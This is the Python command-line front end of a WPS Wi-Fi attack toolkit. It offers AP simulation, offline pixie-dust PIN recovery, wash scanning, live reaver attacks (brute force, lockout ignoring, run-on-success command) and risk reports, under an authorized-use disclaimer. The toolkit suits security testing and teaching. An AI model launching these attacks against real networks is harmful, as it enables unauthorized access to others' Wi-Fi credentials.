"""Command-line interface.

Sub-commands:
    selftest   built-in crypto / PRNG / round-trip verification
    simulate   create a synthetic vulnerable-AP capture (offline)
    pixie      offline WPS PIN recovery from a captured exchange
    scan       discover WPS APs (wash or saved wash file)
    attack     live WPS attack via reaver (+ offline fallback)
    analyze    risk assessment from scan/attack evidence
"""

from __future__ import annotations

import argparse
import json
import os
import random
import secrets
import sys
from typing import Optional

from . import __version__
from .analyzer import analyze_ap
from . import prngs
from .pixiedust import PixieSolver
from .report import write_reports
from .scanner import scan as _scan, wash_available
from .state import load_capture, save_capture
from .simulator import ApConfig, simulated_capture
from .wps import Capture, bin2hex, hex2bin

__all__ = ["main", "build_parser"]

_DISCLAIMER = (
    "Authorized use only: test only networks you own or are explicitly\n"
    "authorized to assess. Unauthorized access is illegal in most\n"
    "jurisdictions. Use of this tool implies you accept responsibility."
)


def _p(*flags: str) -> str:
    return flags[0]


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wps-attack",
        description="WiFi WPS security analysis & attack toolkit "
                    "(offline pixie-dust solver, AP simulator, wash "
                    "scanning, reaver orchestration, risk reports).",
        epilog=_DISCLAIMER,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--version", action="version",
                   version=f"wps-attack {__version__}")
    sub = p.add_subparsers(dest="cmd", required=True)

    # -- selftest ---------------------------------------------------------
    sp = sub.add_parser("selftest", help="run built-in self-test")
    sp.set_defaults(func=cmd_selftest)

    # -- simulate ---------------------------------------------------------
    sp = sub.add_parser("simulate",
                        help="generate a synthetic vulnerable-AP capture")
    sp.add_argument("--pin", help="WPS PIN (default: random valid PIN)")
    sp.add_argument("--mode", default="rtl819x",
                    choices=["rt", "rtl819x", "ecos-simple", "ecos-simplest",
                             "ecos-knuth", "zero", "nonce-clone", "random"],
                    help="AP weak-PRNG mode (default: rtl819x)")
    sp.add_argument("--seed", type=int, default=None,
                    help="PRNG seed (default: current unix time)")
    sp.add_argument("--no-rtl-key", action="store_true",
                    help="don't use the RTL819x fixed PKE for rtl819x mode")
    sp.add_argument("--bssid", help="AP MAC (hex, default random)")
    sp.add_argument("--out", default=None,
                    help="save capture JSON to this path")
    sp.add_argument("--solve", action="store_true",
                    help="also run the offline solver on the capture")
    sp.set_defaults(func=cmd_simulate)

    # -- pixie --------------------------------------------------------------
    sp = sub.add_parser("pixie",
                        help="offline WPS PIN recovery (pixie dust)")
    sp.add_argument("capture", nargs="?",
                    help="saved capture JSON (from simulate/attack), or "
                         "provide hex flags")
    sp.add_argument("--pke", help="enrollee (AP) public key, 192 bytes hex")
    sp.add_argument("--pkr", help="registrar public key, 192 bytes hex")
    sp.add_argument("--e-hash1", help="E-Hash1, 32 bytes hex")
    sp.add_argument("--e-hash2", help="E-Hash2, 32 bytes hex")
    sp.add_argument("--e-nonce", help="E-Nonce, 16 bytes hex")
    sp.add_argument("--r-nonce", help="R-Nonce, 16 bytes hex (authkey path)")
    sp.add_argument("--bssid", help="AP MAC hex (authkey path)")
    sp.add_argument("--authkey", help="AuthKey 32 bytes hex (skip DH)")
    sp.add_argument("--dh-small", action="store_true",
                    help="attacker used small DH privkey (PKE==2 path)")
    sp.add_argument("--mode", default="auto",
                    choices=["auto", "rt", "rtl819x", "ecos-simple",
                             "ecos-simplest", "ecos-knuth"],
                    help="PRNG mode (default: auto-detect)")
    sp.add_argument("--rtl-start", type=int, help="RTL819x seed range start")
    sp.add_argument("--rtl-end", type=int, help="RTL819x seed range end")
    sp.add_argument("--rtl-full", action="store_true",
                    help="scan all 2^32 glibc seeds (very slow)")
    sp.add_argument("--ecos-limit", type=int, default=None,
                    help="cap ECOS_SIMPLEST/KNUTH scan (default 2^24)")
    sp.add_argument("--jobs", type=int, default=1,
                    help="worker processes for the RTL819x seed scan")
    sp.add_argument("--out", default=None, help="save result JSON here")
    sp.set_defaults(func=cmd_pixie)

    # -- scan ---------------------------------------------------------------
    sp = sub.add_parser("scan", help="discover WPS APs (wash)")
    sp.add_argument("-i", "--iface", help="monitor-mode interface (live)")
    sp.add_argument("--wash-file", help="parse a saved wash output file")
    sp.add_argument("--timeout", type=int, default=15,
                    help="wash timeout seconds (default 15)")
    sp.add_argument("--out-report", action="store_true",
                    help="write a Markdown/JSON assessment report")
    sp.add_argument("--output-dir", default="reports",
                    help="report directory (default ./reports)")
    sp.set_defaults(func=cmd_scan)

    # -- attack -------------------------------------------------------------
    sp = sub.add_parser("attack", help="live WPS attack via reaver")
    sp.add_argument("-i", "--iface", required=True,
                    help="monitor-mode interface")
    sp.add_argument("-b", "--bssid", required=True, help="target AP MAC")
    sp.add_argument("--mode", default="pixie",
                    choices=["pixie", "bruteforce", "pin"],
                    help="attack mode (default: pixie dust via -K)")
    sp.add_argument("--pin", help="known/forced PIN (mode=pin)")
    sp.add_argument("-g", "--max-attempts", type=int, default=0,
                    help="brute-force attempt cap (reaver -g)")
    sp.add_argument("-d", "--delay", type=int, default=1,
                    help="seconds between attempts (reaver -d)")
    sp.add_argument("--no-dh-small", action="store_true",
                    help="don't use small DH key (reaver -S)")
    sp.add_argument("-c", "--channel", type=int, help="fixed channel")
    sp.add_argument("-e", "--essid", help="known SSID (skips probe)")
    sp.add_argument("-s", "--session", help="reaver session file (-s)")
    sp.add_argument("-C", "--exec", help="command on PIN success (reaver -C)")
    sp.add_argument("-L", "--ignore-locks", action="store_true",
                    help="ignore WPS lockouts (reaver -L)")
    sp.add_argument("--timeout", type=float, default=None,
                    help="max seconds for the whole run")
    sp.add_argument("--offline-fallback", action="store_true",
                    help="if reaver's pixiewps fails, retry with the "
                         "built-in offline solver")
    sp.add_argument("--out-report", action="store_true",
                    help="write a Markdown/JSON assessment report")
    sp.add_argument("--output-dir", default="reports",
                    help="report directory (default ./reports)")
    sp.set_defaults(func=cmd_attack)

    # -- analyze --------------------------------------------------------------
    sp = sub.add_parser("analyze", help="risk assessment (no attack)")
    sp.add_argument("--wash-file", help="wash output file to assess")
    sp.add_argument("-i", "--iface", help="live wash scan")
    sp.add_argument("-b", "--bssid", help="assess a single BSSID from file")
    sp.add_argument("--pin", help="known/recovered PIN")
    sp.add_argument("--rekey", choices=["yes", "no"], default=None,
                    help="rekey observed? (mitigates pixie dust)")
    sp.add_argument("--wps-version", help="observed WPS version")
    sp.add_argument("--pixie-success", action="store_true",
                    help="a pixie-dust attack succeeded on this AP")
    sp.add_argument("--timeout", type=int, default=15)
    sp.add_argument("--output-dir", default="reports",
                    help="report directory (default ./reports)")
    sp.add_argument("--filename-base", default="wps-report")
    sp.set_defaults(func=cmd_analyze)

    return p


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_HEX_FIELDS = (("pke", "pke", 192), ("pkr", "pkr", 192),
               ("e_hash1", "ehash1", 32), ("e_hash2", "ehash2", 32),
               ("e_nonce", "enonce", 16), ("r_nonce", "rnonce", 16),
               ("authkey", "authkey", 32))


def _build_capture_from_args(a) -> Capture:
    """Assemble a Capture from hex CLI flags (or a saved file)."""
    from . import crypto
    if a.capture:
        cap = load_capture(a.capture)
        # optional CLI overrides for individual fields
        for flag, attr, size in _HEX_FIELDS:
            val = getattr(a, flag, None)
            if val:
                setattr(cap, attr, crypto.hex2bin(val, size))
        if getattr(a, "dh_small", False):
            cap.small_dh = True
        if a.bssid:
            cap.bssid = crypto.hex2bin(a.bssid, 6)
        return cap
    for flag, _attr, _size in _HEX_FIELDS[:5]:
        if not getattr(a, flag, None):
            raise SystemExit(
                f"error: --{flag} (or a capture file) is required")
    cap = Capture(
        pke=crypto.hex2bin(a.pke, 192), pkr=crypto.hex2bin(a.pkr, 192),
        ehash1=crypto.hex2bin(a.e_hash1, 32),
        ehash2=crypto.hex2bin(a.e_hash2, 32),
        enonce=crypto.hex2bin(a.e_nonce, 16),
        rnonce=crypto.hex2bin(a.r_nonce, 16) if a.r_nonce else None,
        bssid=crypto.hex2bin(a.bssid, 6) if a.bssid else None,
        authkey=crypto.hex2bin(a.authkey, 32) if a.authkey else None,
        small_dh=bool(a.dh_small),
    )
    return cap


def _print_result(res) -> None:
    if res.found:
        print()
        print("=" * 60)
        print(f"  [+] WPS PIN: {res.pin if res.pin else '<empty>'}")
        if res.psk1 is not None:
            print(f"      PSK1 = {bin2hex(res.psk1)}")
            print(f"      PSK2 = {bin2hex(res.psk2)}")
        print(f"      mode  = {res.mode}   seeds = {res.seeds}")
        print(f"      time  = {res.duration:.2f}s   hmac checks = "
              f"{res.attempts}")
        print("=" * 60)
    else:
        print()
        print("  [-] WPS PIN not found.")
        print("      The AP may use a secure PRNG, or a mode outside the "
              "auto-detection list.")
        print("      Try explicit --mode (rt / rtl819x / ecos-simple / "
              "ecos-simplest / ecos-knuth),")
        print("      or a wider RTL819x seed window: --rtl-start/--rtl-end "
              "(or --rtl-full).")
        print("      Per-mode progress lines above show where each "
              "candidate failed.")


# ---------------------------------------------------------------------------
# Sub-commands
# ---------------------------------------------------------------------------

def cmd_selftest(a) -> int:
    from .selftest import run_selftest
    return run_selftest()


def cmd_simulate(a) -> int:
    if a.pin is None:
        from .wps import complete_pin
        pin = complete_pin(random.randrange(10000), random.randrange(1000))
    from . import crypto as _crypto
    bssid = _crypto.hex2bin(a.bssid, 6) if a.bssid else None
    # RTL fixed PKE only makes sense in rtl819x mode; otherwise the AP key
    # is random (ApConfig's default) unless --no-rtl-key is given.
    cfg = ApConfig(pin=a.pin if a.pin is not None else pin,
                   prng_mode=a.mode, seed=a.seed, bssid=bssid,
                   use_rtl_fixed_key=False if a.no_rtl_key else None)
    sim = simulated_capture(cfg)
    print(f"simulated AP   : bssid={bin2hex(sim.capture.bssid)} "
          f"mode={a.mode} seed={cfg.seed}")
    print(f"pin            : {cfg.pin}")
    print(f"pke (AP)       : {bin2hex(sim.capture.pke)}")
    print(f"pkr (registrar): {bin2hex(sim.capture.pkr)}")
    print(f"e-hash1        : {bin2hex(sim.capture.ehash1)}")
    print(f"e-hash2        : {bin2hex(sim.capture.ehash2)}")
    print(f"e-nonce        : {bin2hex(sim.capture.enonce)}")
    print(f"r-nonce        : {bin2hex(sim.capture.rnonce)}")
    print(f"authkey        : {bin2hex(sim.capture.authkey)}")
    if a.out:
        save_capture(a.out, sim.capture)
        print(f"capture saved  : {a.out}")
        print(f"now solve it   : wps-attack pixie {a.out}")
    if a.solve:
        print()
        solver = PixieSolver(sim.capture)
        res = solver.auto()
        _print_result(res)
        return 0 if res.found else 1
    return 0


def cmd_pixie(a) -> int:
    cap = _build_capture_from_args(a)
    problems = cap.validate()
    if problems:
        raise SystemExit("error: " + "; ".join(problems))
    print(f"PKE        : {bin2hex(cap.pke)[:32]}...")
    print(f"PKR        : {bin2hex(cap.pkr)[:32]}...")
    print(f"E-Nonce    : {bin2hex(cap.enonce)}")
    if cap.bssid:
        print(f"BSSID      : {bin2hex(cap.bssid)}")
    print()
    solver = PixieSolver(cap)

    if a.mode == "auto":
        res = solver.auto(rtl_start=a.rtl_start, rtl_end=a.rtl_end,
                          rtl_full=a.rtl_full, ec_limit=a.ecos_limit,
                          jobs=a.jobs)
    else:
        mode_map = {"rt": prngs.RT, "rtl819x": prngs.RTL819x,
                    "ecos-simple": prngs.ECOS_SIMPLE,
                    "ecos-simplest": prngs.ECOS_SIMPLEST,
                    "ecos-knuth": prngs.ECOS_KNUTH}
        res = solver.auto(modes=[mode_map[a.mode]],
                          rtl_start=a.rtl_start, rtl_end=a.rtl_end,
                          rtl_full=a.rtl_full, ec_limit=a.ecos_limit,
                          jobs=a.jobs)
    _print_result(res)
    if a.out:
        payload = res.__dict__.copy()
        payload["capture"] = cap.to_dict()
        with open(a.out, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2, default=str)
        print(f"result saved   : {a.out}")
    return 0 if res.found else 1


def cmd_scan(a) -> int:
    if not (a.iface or a.wash_file):
        raise SystemExit("error: provide --iface (live) or --wash-file")
    aps = _scan(iface=a.iface, wash_file=a.wash_file, timeout=a.timeout)
    if not aps:
        print("no WPS APs found.")
        return 0
    print(f"{'BSSID':<19}{'Ch':>4}  {'WPS':<5}{'Locked':<8}{'Signal':>8}  "
          "SSID")
    for ap in aps:
        print(f"{ap.bssid:<19}{ap.channel:>4}  {str(ap.wps):<5}"
              f"{'Y' if ap.locked else 'N':<8}{ap.signal_dbm:>5} dBm  "
              f"{ap.ssid or '-'}")
    if a.out_report:
        from .analyzer import analyze_ap as _ap
        assessments = [_ap(ap) for ap in aps]
        paths = write_reports(a.output_dir, assessments, scans=aps,
                              title="WPS Scan Report",
                              filename_base="wps-scan")
        print(f"report: {paths['markdown']}")
        print(f"report: {paths['json']}")
    return 0


def cmd_attack(a) -> int:
    from .reaver_ctl import ReaverCtl, reaver_available
    if not reaver_available():
        print("[!] reaver is not installed - installing/building reaver is "
              "required for live attacks.")
        print("    https://github.com/t6x/reaver-wps-fork-t6x")
        return 2
    ctl = ReaverCtl(
        iface=a.iface, bssid=a.bssid, mode=a.mode,
        max_attempts=a.max_attempts, delay=a.delay,
        dh_small=(not a.no_dh_small), channel=a.channel, essid=a.essid,
        pin=a.pin, session=a.session, exec_cmd=a.exec,
        ignore_locks=a.ignore_locks)
    res = ctl.run(timeout=a.timeout)
    if res.pin is not None:
        print()
        print(f"[+] PIN found by reaver: {res.pin if res.pin else '<empty>'}")
        if res.psk_hex:
            print(f"    WPA PSK: {res.psk_hex}")
    if a.offline_fallback and res.pin is None and res.capture is not None:
        cap = res.capture
        if not cap.validate():
            print()
            print("[*] reaver's pixiewps failed - retrying with the "
                  "built-in offline solver ...")
            solver = PixieSolver(cap)
            ores = solver.auto()
            if ores.found:
                res.ok = True
                res.pin = ores.pin
                res.offline_pin = ores.pin
                _print_result(ores)
    if a.out_report:
        from .analyzer import analyze_ap as _ap
        assessment = _ap(None, pin=res.pin,
                         pixie_success=res.pin is not None,
                         rekey=res.rekey, wps_version=res.wps_version)
        paths = write_reports(a.output_dir, [assessment],
                              title=f"WPS Attack Report {a.bssid}",
                              filename_base=f"wps-attack-{a.bssid.replace(':', '')}")
        print(f"report: {paths['markdown']}")
        print(f"report: {paths['json']}")
    return 0 if res.pin is not None else 1


def cmd_analyze(a) -> int:
    if not (a.wash_file or a.iface or a.bssid):
        raise SystemExit(
            "error: provide --wash-file, --iface or --bssid (+ file)")
    if a.bssid and not (a.wash_file or a.iface):
        raise SystemExit("error: --bssid needs --wash-file or --iface")
    aps = _scan(iface=a.iface, wash_file=a.wash_file, timeout=a.timeout)
    if a.bssid:
        aps = [ap for ap in aps
               if ap.bssid.upper() == a.bssid.upper()]
        if not aps:
            raise SystemExit(f"error: {a.bssid} not in scan data")
    rekey = None
    if a.rekey is not None:
        rekey = (a.rekey == "yes")
    assessments = [
        analyze_ap(ap, pin=a.pin, pixie_success=a.pixie_success,
                   rekey=rekey, wps_version=a.wps_version)
        for ap in aps
    ]
    for asmt in assessments:
        print(f"{asmt.bssid}: {asmt.rating} (score {asmt.score})"
              + (f"  pin={asmt.pin}" if asmt.pin else ""))
        for f in asmt.findings:
            print(f"    [{f.severity}] {f.title}  ({f.weight:+d})")
    paths = write_reports(a.output_dir, assessments,
                          scans=aps if aps else None,
                          title="WPS Risk Assessment",
                          filename_base=a.filename_base)
    print(f"report: {paths['markdown']}")
    print(f"report: {paths['json']}")
    return 0


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return int(args.func(args) or 0)
    except KeyboardInterrupt:
        print("\ninterrupted")
        return 130
    except RuntimeError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
